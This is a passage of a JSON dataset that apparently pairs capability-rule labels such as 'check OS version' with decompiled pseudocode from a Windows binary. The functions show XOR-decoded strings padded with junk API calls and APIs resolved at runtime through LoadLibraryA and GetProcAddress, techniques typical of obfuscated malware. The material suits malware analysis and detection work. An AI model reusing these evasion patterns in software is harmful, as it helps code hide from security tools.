= fcn.004087a4(iVar11 + 0x28, 0x40),  arg_8h_00 = var_10h,  var_54h != 0)) {\n                var_44h = *(iVar11 + 0x3c);\n                var_64h = *(iVar11 + 0x18) + 0x10;\n                var_8h = *(iVar11 + 0x1c) + (0xffffffef < *(iVar11 + 0x18));\n                var_ch = var_6ch + 2;\n                var_48h = *(iVar11 + 0x38);\n                var_50h = 4;\n                if ((var_48h != var_64h) || (*(iVar11 + 0x3c) != var_8h)) {\n                    do {\n                        var_54h = fcn.004087a4(iVar11 + 0x68, 0x98);\n                        iVar5 = var_5ch;\n                        iVar4 = var_68h;\n                        if (var_54h == 0) break;\n                        var_78h = *(iVar11 + 0x68);\n                        var_74h = *(iVar11 + 0x6c);\n                        var_50h = var_50h + 0x120;\n                        var_48h = var_78h;\n                        var_44h = var_74h;\n                        if (var_50h <= arg_8h) {\n                            uVar7 = *(iVar11 + 0xb0) >> 1;\n                            *(var_ch + 6) = var_58h;\n                            var_ch[5] = *(iVar11 + 0xd0);\n                            *(var_ch + 7) = *(iVar11 + 0xd4);\n                            var_ch[4] = *(iVar11 + 0xa8);\n                            var_ch[2] = *(iVar11 + 0x98);\n                            var_ch[3] = *(iVar11 + 0x9c);\n                            puVar12 = arg_8h_00;\n                            for (iVar4 = 0x200; iVar4 != 0; iVar4 = iVar4 + -1) {\n                                *puVar12 = 0;\n                                puVar12 = puVar12 + 1;\n                            }\n                            var_70h = uVar7;\n                            if ((uVar7 < 0x100) && (var_54h = fcn.004087a4(arg_8h_00, *(iVar11 + 0xb0)),  var_54h != 0))\n                            {\n                                uVar8 = 0;\n                                if (uVar7 != 0) {\n                                    do {\n                                        *(uVar8 + 0x20 + var_ch) = arg_8h_00[uVar8 * 2];\n                                        uVar8 = uVar8 + 1;\n                                    } while (uVar8 < uVar7);\n                                }\n                                *(uVar7 + 0x20 + var_ch) = 0;\n                                piVar9 = NULL;\n                                piVar13 = var_ch + 8;\n                                do {\n                                    cVar1 = *piVar13;\n                                    if (cVar1 == '\\\\') {\n                                        piVar9 = piVar13;\n                                    }\n                                    piVar13 = piVar13 + 1;\n                                } while (cVar1 != '\\0');\n                                *(var_ch + 0x1e) = (piVar9 - var_ch) + -0x1f;\n                            }\n                            var_ch = var_ch + 0x48;\n                            var_58h = var_58h + 1;\n                        }\n                    } while ((var_78h != var_64h) || (iVar5 = var_5ch,  iVar4 = var_68h,  var_74h != var_8h));\n                }\n                if (var_6ch != NULL) {\n                    *var_6ch = var_58h;\n                }\n            }\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_10h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if (iVar11 != 0) {\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar11);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            }\n        }\n    }\n    if (arg_ch != NULL) {\n        *arg_ch = var_50h;\n    }\n    if ((var_50h <= arg_8h) && (var_50h != 0)) {\n        var_60h = 1;\n    }\n    uVar3 = (*pcVar10)(0, iVar4);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar10)(0, iVar5);\n    (*pcVar2)(uVar3);\n    return var_60h;\n}\n",
        "token_count": 2887
    },
    "00408e12": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00408e12(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_ch = 0;\n    if ((*0x41db20 | *0x41db24) != 0) {\ncode_r0x004091cc:\n        var_ch = 0x41db20;\n        goto code_r0x004091d1;\n    }\n    var_30h = 0x3b2f1723;\n    var_2ch = 0x27076358;\n    var_28h._0_2_ = 0x343b;\n    var_24h = 0x574b634d;\n    var_20h._0_1_ = 0x34;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_18h = 5;\n    iVar6 = 0;\n    var_1ch = &var_30h - iVar2;\n    var_8h = iVar2;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_CreateMenu)();\n        if (iVar3 != 0x86a4c2) {\n            *(iVar6 + iVar2) = *(&var_24h + iVar6 % var_18h) ^ (iVar6 + iVar2)[var_1ch];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 10);\n    var_48h = 0x28372637;\n    var_44h = 0x3f020e3f;\n    var_40h = 0x39332804;\n    var_3ch = 0x28023939;\n    var_38h._0_1_ = 0x2a;\n    var_38h._1_1_ = 0x29;\n    var_38h._2_1_ = 0x6d;\n    var_2ch = 0x4d70516d;\n    var_28h._0_2_ = 0x4d4b;\n    uVar1 = (*pcVar5)(8, 0x14);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_1ch = 6;\n    iVar6 = 0;\n    var_10h = &var_48h - iVar2;\n    var_14h = iVar2;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        iVar3 = var_8h;\n        if (iVar4 != 0xe384e8) {\n            *(iVar6 + iVar2) = *(&var_2ch + iVar6 % var_1ch) ^ (iVar6 + iVar2)[var_10h];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x13);\n    *0x41db20 = fcn.0040931b(iVar2);\n    if (*0x41db20 == 0) {\n        uVar1 = (*pcVar5)(0, iVar2);\n        pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\ncode_r0x00408f46:\n        (*pcVar7)(uVar1);\n        uVar1 = (*pcVar5)(0, iVar3);\n        (*pcVar7)(uVar1);\n    }\n    else {\n        var_48h = 0x32361822;\n        var_44h = 0xb003b44;\n        var_40h = 0x1b005523;\n        var_3ch = 0x1d423f31;\n        var_38h._0_1_ = 0xe;\n        var_38h._1_1_ = 1;\n        var_38h._2_1_ = 0x57;\n        var_24h = 0x57656f78;\n        var_20h._0_1_ = 0x30;\n        uVar1 = (*pcVar5)(8, 0x14);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar6 = 0;\n        var_10h = &var_48h - iVar2;\n        var_4h = iVar2;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n            iVar3 = var_8h;\n            if (iVar4 != 0x663716) {\n                *(iVar6 + iVar2) = *(&var_24h + iVar6 % var_18h) ^ (iVar6 + iVar2)[var_10h];\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 0x13);\n        *0x41db28 = fcn.0040931b(iVar2);\n        iVar2 = var_14h;\n        if (*0x41db28 == 0) {\n            uVar1 = (*pcVar5)(0, var_4h);\n            pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n        }\n        else {\n            var_48h = 0x27e3419;\n            var_44h = 0x562a1500;\n            var_40h = 0x10253f14;\n            var_3ch = 0x2a040056;\n            var_38h._0_1_ = 0x2c;\n            var_38h._1_1_ = 0x5d;\n            var_38h._2_1_ = 99;\n            var_2ch = 0x63334343;\n            var_28h._0_2_ = CONCAT11(var_28h._1_1_, 0x70);\n            uVar1 = (*pcVar5)(8, 0x14);\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar6 = 0;\n            var_24h = &var_48h - iVar2;\n            var_10h = iVar2;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n                iVar3 = var_8h;\n                if (iVar4 != 0xf6b593) {\n                    *(iVar6 + iVar2) = *(&var_2ch + iVar6 % var_18h) ^ (iVar6 + iVar2)[var_24h];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x13);\n            *0x41db30 = fcn.0040931b(iVar2);\n            iVar2 = var_14h;\n            if (*0x41db30 != 0) {\n                var_48h = 0x1c1d2031;\n                var_44h = 0x11b281f;\n                var_38h._0_1_ = 6;\n                var_40h = 0x6051721;\n                var_3ch = 0x112d040d;\n                var_38h._1_1_ = 0x20;\n                var_38h._2_1_ = 4;\n                stack0xffffffc7 = 0x4839;\n                var_2ch = 0x7248576b;\n                var_28h._0_2_ = 0x4972;\n                uVar1 = (*pcVar5)(8, 0x16);\n                iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                iVar6 = 0;\n                var_24h = &var_48h - iVar2;\n                do {\n                    iVar4 = (*_sym.imp.USER32.dll_GetCursor)();\n                    iVar3 = var_8h;\n                    if (iVar4 != 0xf152a1) {\n                        *(iVar6 + iVar2) = *(&var_2ch + iVar6 % var_1ch) ^ (iVar6 + iVar2)[var_24h];\n                    }\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < 0x15);\n                *0x41db38 = fcn.0040931b(iVar2);\n                if (*0x41db38 != 0) {\n                    uVar1 = (*pcVar5)(0, iVar2);\n                    pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                    uVar1 = (*pcVar5)(0, var_10h);\n                    (*pcVar7)(uVar1);\n                    uVar1 = (*pcVar5)(0, var_4h);\n                    (*pcVar7)(uVar1);\n                    uVar1 = (*pcVar5)(0, var_14h);\n                    (*pcVar7)(uVar1);\n                    uVar1 = (*pcVar5)(0, iVar3);\n                    (*pcVar7)(uVar1);\n                    goto code_r0x004091cc;\n                }\n                uVar1 = (*pcVar5)(0, iVar2);\n                pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                uVar1 = (*pcVar5)(0, var_10h);\n                (*pcVar7)(uVar1);\n                uVar1 = (*pcVar5)(0, var_4h);\n                (*pcVar7)(uVar1);\n                uVar1 = (*pcVar5)(0, var_14h);\n                goto code_r0x00408f46;\n            }\n            uVar1 = (*pcVar5)(0, var_10h);\n            pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4h);\n        }\n        (*pcVar5)(uVar1);\n        pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n        (*pcVar5)(uVar1);\n        uVar1 = (*pcVar7)(0, iVar3);\n        (*pcVar5)(uVar1);\n    }\ncode_r0x004091d1:\n    *0x41db34 = *0x41db30 >> 0x20;\n    *0x41db3c = *0x41db38 >> 0x20;\n    *0x41db2c = *0x41db28 >> 0x20;\n    *0x41db24 = *0x41db20 >> 0x20;\n    return var_ch;\n}\n",
        "token_count": 2588
    },
    "0040949c": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.0040949c(uint param_1, uint param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t lpLibFileName;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_2ch = 0x57424508;\n    var_28h = 0x45093831;\n    var_24h._0_2_ = 0x5732;\n    var_20h = 0x57324567;\n    var_1ch._0_2_ = 0x3854;\n    var_14h = param_2;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_4h = 6;\n    iVar8 = 0;\n    var_ch = &var_2ch - iVar3;\n    var_8h = iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n        if (iVar4 != 0xd38982) {\n            *(iVar8 + iVar3) = *(&var_20h + iVar8 % var_4h) ^ (iVar8 + iVar3)[var_ch];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 10);\n    var_30h = 0x3157124;\n    var_2ch = 0x7e0b443f;\n    var_28h = 0x391b1f2b;\n    var_20h = 0x4f503977;\n    var_1ch._0_2_ = CONCAT11(var_1ch._1_1_, 0x73);\n    uVar2 = (*pcVar6)(8, 0xd);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    lpLibFileName = iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        if (iVar4 != 0x3d25d0) {\n            var_ch = 5;\n            *(iVar8 + iVar3) = *(&var_20h + iVar8 % 5) ^ (iVar8 + iVar3)[&var_30h - iVar3];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xc);\n    var_30h = 0x35130f2a;\n    var_2ch = 0x2017522;\n    var_28h = 0x553a2c15;\n    var_24h._0_2_ = 0x672e;\n    var_20h = 0x59766779;\n    var_1ch._0_2_ = 0x304e;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xf);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    var_ch = &var_30h - iVar3;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_CountClipboardFormats)();\n        iVar4 = lpLibFileName;\n        if (iVar5 != 0x80cfd5) {\n            *(iVar8 + iVar3) = *(&var_20h + iVar8 % var_4h) ^ (iVar8 + iVar3)[&var_30h - iVar3];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xe);\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar3);\n    pcVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    uVar7 = (*pcVar6)(0, var_8h, var_18h, var_14h, 0, 0);\n    if (0x20 < uVar7) {\n        uVar7 = 0;\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*pcVar6)(uVar2);\n    uVar2 = (*pcVar1)(0, var_8h);\n    (*pcVar6)(uVar2);\n    return uVar7;\n}\n",
        "token_count": 1185
    },
    "0040bcbe": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040bcbe(uchar *param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    uchar *puVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uchar *var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_24h = param_1;\n    if ((((*0x41db94 | *0x41db98) == 0) || ((*0x41db9c | *0x41dba0) == 0)) || ((*0x41dba4 | *0x41dba8) == 0)) {\n        var_4h = 0x7f;\n        var_30h = 0x3b2f1723;\n        var_2ch = 0x27076358;\n        var_28h._0_2_ = 0x343b;\n        var_20h = 0x574b634d;\n        var_1ch._0_1_ = 0x34;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        var_ch = 5;\n        iVar6 = 0;\n        var_14h = iVar2;\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_CreateMenu)();\n            if (iVar3 != 0x86a4c2) {\n                *(iVar6 + iVar2) = *(&var_20h + iVar6 % var_ch) ^ (iVar6 + iVar2)[&var_30h - iVar2];\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 10);\n        var_10h = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar2);\n        if (var_10h == 0) {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            return var_4h;\n        }\n        var_3ch = 0x79253418;\n        var_38h = 0x1430561f;\n        var_34h._0_2_ = 0x593b;\n        var_34h._2_1_ = 0x70;\n        var_2ch = 0x35575054;\n        var_28h._0_2_ = 0x3770;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar6 = 0;\n        var_18h = iVar2;\n        var_8h = &var_3ch - iVar2;\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_GetCursor)();\n            if (iVar3 != 0xc9293f) {\n                var_8h = 6;\n                *(iVar6 + iVar2) = *(&var_2ch + iVar6 % 6) ^ (iVar6 + iVar2)[&var_3ch - iVar2];\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 0xb);\n        *0x41db94 = fcn.0040852b();\n        iVar6 = var_14h;\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        *0x41db98 = *0x41db94 >> 0x1f;\n        if ((*0x41db94 | *0x41db98) == 0) {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n        }\n        else {\n            var_54h = 0x133e563c;\n            var_50h = 0x3e620455;\n            var_4ch = 0x5615533b;\n            var_48h = 0x31552639;\n            var_44h = 0x55262856;\n            var_40h._0_2_ = 0x4103;\n            var_40h._2_1_ = 0x4c;\n            var_2ch = 0x544c3270;\n            var_28h._0_2_ = CONCAT11(var_28h._1_1_, 0x30);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar6 = 0;\n            var_20h = &var_54h - iVar2;\n            var_8h = iVar2;\n            do {\n                iVar3 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n                if (iVar3 != 0xa7338) {\n                    *(iVar6 + iVar2) = *(&var_2ch + iVar6 % var_ch) ^ (iVar6 + iVar2)[&var_54h - iVar2];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x17);\n            *0x41db9c = fcn.0040852b();\n            iVar6 = var_14h;\n            iVar2 = var_18h;\n            *0x41dba0 = *0x41db9c >> 0x1f;\n            if ((*0x41db9c | *0x41dba0) == 0) {\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n                pcVar4 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n                (*pcVar4)(uVar1);\n                uVar1 = (*pcVar7)(0, iVar6);\n                (*pcVar4)(uVar1);\n                return var_4h;\n            }\n            var_54h = 0x37111f69;\n            var_50h = 0x220d472d;\n            var_4ch = 0x1a5a1431;\n            var_48h = 0x5f233035;\n            var_44h = 0x2d282425;\n            var_40h._0_2_ = 0x1141;\n            var_40h._2_1_ = 0x41;\n            var_2ch = 0x45416833;\n            var_28h._0_2_ = CONCAT11(var_28h._1_1_, 0x42);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar6 = 0;\n            var_20h = &var_54h - iVar2;\n            do {\n                iVar3 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n                if (iVar3 != 0x3ec49f) {\n                    *(iVar6 + iVar2) = *(&var_2ch + iVar6 % var_ch) ^ (iVar6 + iVar2)[&var_54h - iVar2];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x17);\n            *0x41dba4 = fcn.0040852b();\n            iVar6 = var_14h;\n            pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            *0x41dba8 = *0x41dba4 >> 0x1f;\n            if ((*0x41dba4 | *0x41dba8) != 0) {\n                var_4h = 0;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n                pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                uVar1 = (*pcVar4)(0, var_8h);\n                (*pcVar7)(uVar1);\n                uVar1 = (*pcVar4)(0, var_18h);\n                (*pcVar7)(uVar1);\n                uVar1 = (*pcVar4)(0, iVar6);\n                (*pcVar7)(uVar1);\n                goto code_r0x0040bff8;\n            }\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            uVar1 = (*pcVar4)(0, var_8h);\n            (*pcVar7)(uVar1);\n            uVar1 = (*pcVar4)(0, var_18h);\n        }\n        (*pcVar7)(uVar1);\n        uVar1 = (*pcVar4)(0, iVar6);\n        (*pcVar7)(uVar1);\n    }\n    else {\ncode_r0x0040bff8:\n        puVar5 = 0x41db94;\n        for (iVar2 = 0x18; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *var_24h = *puVar5;\n            puVar5 = puVar5 + 1;\n            var_24h = var_24h + 1;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 2357
    },
    "0040c00e": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040c00e(uchar *param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uchar *puVar6;\n    int32_t iVar7;\n    code *pcVar8;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uchar *var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_24h = param_1;\n    if ((((*0x41dbac | *0x41dbb0) == 0) || ((*0x41dbb4 | *0x41dbb8) == 0)) || ((*0x41dbbc | *0x41dbc0) == 0)) {\n        var_4h = 0x7f;\n        var_30h = 0x3b2f1723;\n        var_2ch = 0x27076358;\n        var_28h._0_2_ = 0x343b;\n        var_20h = 0x574b634d;\n        var_1ch._0_1_ = 0x34;\n        var_14h = param_2;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        var_ch = 5;\n        iVar7 = 0;\n        var_10h = iVar2;\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_CreateMenu)();\n            if (iVar3 != 0x86a4c2) {\n                *(iVar7 + iVar2) = *(&var_20h + iVar7 % var_ch) ^ (iVar7 + iVar2)[&var_30h - iVar2];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 10);\n        var_3ch = 0x79253418;\n        var_38h = 0x1430561f;\n        var_34h._0_2_ = 0x593b;\n        var_34h._2_1_ = 0x70;\n        var_2ch = 0x35575054;\n        var_28h._0_2_ = 0x3770;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar7 = 0;\n        var_18h = iVar2;\n        var_8h = &var_3ch - iVar2;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetCursor)();\n            iVar3 = var_10h;\n            if (iVar4 != 0xc9293f) {\n                var_8h = 6;\n                *(iVar7 + iVar2) = *(&var_2ch + iVar7 % 6) ^ (iVar7 + iVar2)[&var_3ch - iVar2];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0xb);\n        *0x41dbac = fcn.0040931b(iVar2);\n        pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (*0x41dbac == 0) {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n        }\n        else {\n            var_54h = 0x133e563c;\n            var_50h = 0x3e620455;\n            var_4ch = 0x5615533b;\n            var_48h = 0x31552639;\n            var_44h = 0x55262856;\n            var_40h._0_2_ = 0x4103;\n            var_40h._2_1_ = 0x4c;\n            var_2ch = 0x544c3270;\n            var_28h._0_2_ = CONCAT11(var_28h._1_1_, 0x30);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar7 = 0;\n            var_20h = &var_54h - iVar2;\n            var_8h = iVar2;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n                iVar3 = var_10h;\n                if (iVar4 != 0xa7338) {\n                    *(iVar7 + iVar2) = *(&var_2ch + iVar7 % var_ch) ^ (iVar7 + iVar2)[&var_54h - iVar2];\n                }\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 0x17);\n            *0x41dbb4 = fcn.0040931b(iVar2);\n            iVar2 = var_18h;\n            if (*0x41dbb4 == 0) {\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n                pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n                (*pcVar5)(uVar1);\n                uVar1 = (*pcVar8)(0, iVar3);\n                (*pcVar5)(uVar1);\n                goto code_r0x0040c33c;\n            }\n            var_54h = 0x37111f69;\n            var_50h = 0x220d472d;\n            var_4ch = 0x1a5a1431;\n            var_48h = 0x5f233035;\n            var_44h = 0x2d282425;\n            var_40h._0_2_ = 0x1141;\n            var_40h._2_1_ = 0x41;\n            var_2ch = 0x45416833;\n            var_28h._0_2_ = CONCAT11(var_28h._1_1_, 0x42);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar7 = 0;\n            var_20h = &var_54h - iVar2;\n            do {\n                iVar4 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n                iVar3 = var_10h;\n                if (iVar4 != 0x3ec49f) {\n                    *(iVar7 + iVar2) = *(&var_2ch + iVar7 % var_ch) ^ (iVar7 + iVar2)[&var_54h - iVar2];\n                }\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 0x17);\n            *0x41dbbc = fcn.0040931b(iVar2);\n            pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if (*0x41dbbc != 0) {\n                var_4h = 0;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n                pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                uVar1 = (*pcVar5)(0, var_8h);\n                (*pcVar8)(uVar1);\n                uVar1 = (*pcVar5)(0, var_18h);\n                (*pcVar8)(uVar1);\n                uVar1 = (*pcVar5)(0, iVar3);\n                (*pcVar8)(uVar1);\n                goto code_r0x0040c32f;\n            }\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            uVar1 = (*pcVar5)(0, var_8h);\n            (*pcVar8)(uVar1);\n            uVar1 = (*pcVar5)(0, var_18h);\n        }\n        (*pcVar8)(uVar1);\n        uVar1 = 